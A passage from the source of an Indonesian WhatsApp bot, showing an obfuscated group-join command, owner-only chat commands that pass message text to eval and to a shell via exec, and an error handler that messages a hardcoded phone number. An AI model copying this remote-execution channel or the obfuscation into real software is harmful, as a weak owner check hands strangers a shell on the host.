𝐧𝐨𝐭𝐞 : 𝐡𝐚𝐫𝐮𝐬 𝐠𝐞𝐫𝐜𝐞𝐩, 𝐬𝐚𝐭𝐮 𝐪𝐫 𝐡𝐚𝐧𝐲𝐚 𝐛𝐞𝐫𝐥𝐚𝐤𝐮 *30* 𝐝𝐞𝐭𝐢𝐤, 𝐣𝐢𝐤𝐚 𝐬𝐮𝐝𝐚𝐡 𝐞𝐱𝐩𝐢𝐫𝐞𝐝 𝐚𝐤𝐚𝐧 𝐦𝐮𝐧𝐜𝐮𝐥 𝐤𝐞𝐬𝐚𝐥𝐚𝐡𝐚𝐧 𝐛𝐢𝐥𝐚 𝐝𝐢 𝐬𝐜𝐚𝐧

𝒊𝒏𝒇𝒐 𝒍𝒆𝒃𝒊𝒃 𝒍𝒂𝒏𝒋𝒖𝒕 𝒋𝒐𝒊𝒏 : hubungi wa.me/6281916619735 `;

        Zeltoria.sendMessage(from, { text: txt }, { quoted: m });
        break;
        
        case 'join': {
function _0x49a9(){const _0x554ded=['1059707lHLsKz','63108yiPNeP','https://chat.whatsapp.com/','groupAcceptInvite','split','5849076bhgnoW','3HlGSKR','owner','whatsapp.com','Contoh\x20','73003tGVAdt','catch','7229700reIhRL','216DaUGSj','then','4007020FZdfee','230tOeOVL','235jKYKSx','348RvQBLT','includes','\x20linkgc','2126pkrNOY'];_0x49a9=function(){return _0x554ded;};return _0x49a9();}const _0x39f7f6=_0x1b38;(function(_0x53495b,_0x287747){const _0x1f679d=_0x1b38,_0x464252=_0x53495b();while(!![]){try{const _0x42862f=parseInt(_0x1f679d(0x18b))/0x1*(parseInt(_0x1f679d(0x17a))/0x2)+-parseInt(_0x1f679d(0x181))/0x3*(-parseInt(_0x1f679d(0x180))/0x4)+-parseInt(_0x1f679d(0x18c))/0x5*(-parseInt(_0x1f679d(0x17c))/0x6)+-parseInt(_0x1f679d(0x185))/0x7*(-parseInt(_0x1f679d(0x188))/0x8)+parseInt(_0x1f679d(0x187))/0x9+parseInt(_0x1f679d(0x18a))/0xa+-parseInt(_0x1f679d(0x17b))/0xb*(parseInt(_0x1f679d(0x18d))/0xc);if(_0x42862f===_0x287747)break;else _0x464252['push'](_0x464252['shift']());}catch(_0x11433d){_0x464252['push'](_0x464252['shift']());}}}(_0x49a9,0xd9ff5));if(!IniZeltoria)return reply(mess[_0x39f7f6(0x182)]);if(!text)return reply(_0x39f7f6(0x184)+(prefix+command)+_0x39f7f6(0x179));if(!isUrl(args[0x0])&&!args[0x0][_0x39f7f6(0x18e)](_0x39f7f6(0x183)))return reply('Link\x20Invalid!');function _0x1b38(_0x46e48d,_0xd6d9d2){const _0x49a913=_0x49a9();return _0x1b38=function(_0x1b381c,_0x875df6){_0x1b381c=_0x1b381c-0x179;let _0x517fc3=_0x49a913[_0x1b381c];return _0x517fc3;},_0x1b38(_0x46e48d,_0xd6d9d2);}let result=args[0x0][_0x39f7f6(0x17f)](_0x39f7f6(0x17d))[0x1];await Zeltoria[_0x39f7f6(0x17e)](result)[_0x39f7f6(0x189)](_0x52adee=>reply(jsonformat(_0x52adee)))[_0x39f7f6(0x186)](_0x9f330=>reply(jsonformat(_0x9f330)));
}
break


//sampe sini dulu

if (budy.startsWith('Gw bukan sepuh')) {
m.reply(`*sepuh..... , sepuh gaboleh gitu nanti waifunya ga nyata loh, kasian member yang lain jadinya gatau mana yang sepuh mana yang bukan , plissss ya sepuh jangan di ulangi><*`)
}

default:
if (budy.startsWith('<')) {
if (!IniZeltoria) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('vv')) {
if (!IniZeltoria) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!IniZeltoria) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Zeltoria.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
Zeltoria.sendMessage("6281916619735@s.whatsapp.net", { text: "Hallo Sayang ,cintaku, kesayangan ku , ada uang error nich Benerin ya sayang >< " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})